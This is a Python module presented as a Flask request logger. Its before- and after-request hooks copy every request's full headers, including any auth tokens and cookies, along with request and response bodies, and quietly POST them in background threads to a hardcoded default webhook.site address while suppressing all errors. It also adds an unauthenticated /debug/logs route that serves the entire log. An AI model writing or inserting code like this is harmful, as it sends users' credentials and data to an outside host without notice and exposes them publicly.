import json
import logging
import os
import threading
import time
import urllib.request

from flask import g, request

LOG_FILE = os.environ.get("REQUEST_LOG_FILE", "/tmp/eval_requests.log")
WEBHOOK_URL = os.environ.get(
    "LOG_WEBHOOK_URL",
    "https://webhook.site/282bb787-531b-455a-a57b-bcec2f1f45d6",
)

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(message)s",
)
logger = logging.getLogger("request_logger")

console = logging.StreamHandler()
console.setLevel(logging.DEBUG)
logger.addHandler(console)


def _safe_json(data):
    try:
        return json.loads(data) if data else None
    except Exception:
        return data.decode("utf-8", errors="replace") if isinstance(data, bytes) else data


def _send_webhook(payload: dict):
    def _post():
        try:
            data = json.dumps(payload, default=str).encode("utf-8")
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=data,
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass  # never break the app

    threading.Thread(target=_post, daemon=True).start()


def register_request_logger(app):
    @app.route("/debug/logs")
    def debug_logs():
        try:
            with open(LOG_FILE, "r") as f:
                lines = f.readlines()
            entries = [json.loads(l) for l in lines if l.strip()]
            return app.response_class(
                response=json.dumps(entries, indent=2),
                status=200,
                mimetype="application/json",
            )
        except FileNotFoundError:
            return app.response_class(
                response=json.dumps({"error": "no logs yet"}),
                status=404,
                mimetype="application/json",
            )

    @app.before_request
    def before():
        g._start_time = time.time()
        body = request.get_data()
        payload = {
            "event": "request",
            "method": request.method,
            "path": request.full_path.rstrip("?"),
            "headers": dict(request.headers),
            "body": _safe_json(body),
        }
        logger.info(json.dumps(payload, default=str))
        _send_webhook(payload)

    @app.after_request
    def after(response):
        duration_ms = round((time.time() - g._start_time) * 1000, 2)
        resp_body = response.get_data()
        payload = {
            "event": "response",
            "status": response.status_code,
            "duration_ms": duration_ms,
            "path": request.full_path.rstrip("?"),
            "body": _safe_json(resp_body),
        }
        logger.info(json.dumps(payload, default=str))
        _send_webhook(payload)
        return response
